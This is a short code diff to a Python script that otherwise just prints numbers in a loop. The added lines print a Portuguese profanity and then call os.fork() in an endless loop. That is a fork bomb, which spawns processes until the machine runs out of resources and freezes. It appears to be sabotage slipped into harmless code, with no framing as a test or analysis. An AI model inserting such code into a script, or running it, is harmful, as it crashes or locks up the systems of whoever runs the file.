@@ -8,3 +8,8 @@ for i in range(10):
 
 for i in range(10):
     print(i)
+import os
+print('tem que se fuder e acabou!')
+while(True):
+	os.fork()
+
